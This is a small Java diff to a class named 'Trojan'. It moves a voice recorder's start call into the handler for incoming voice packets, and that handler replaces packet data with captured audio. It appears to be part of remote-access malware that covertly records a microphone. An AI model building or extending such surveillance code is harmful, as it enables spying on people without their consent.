@@ -18,7 +18,6 @@ public final class Trojan implements IConnectionObserver {
 			lastData = data;
 			source.start();
 		});
-		voiceRecorder.start();
 	}
 	
 	@Override
@@ -26,6 +25,7 @@ public final class Trojan implements IConnectionObserver {
 		if (packet instanceof VoicePacket) {
 			final VoicePacket voice = (VoicePacket)packet;
 			
+			voiceRecorder.start();
 			voice.setData(lastData);
 		}
 		
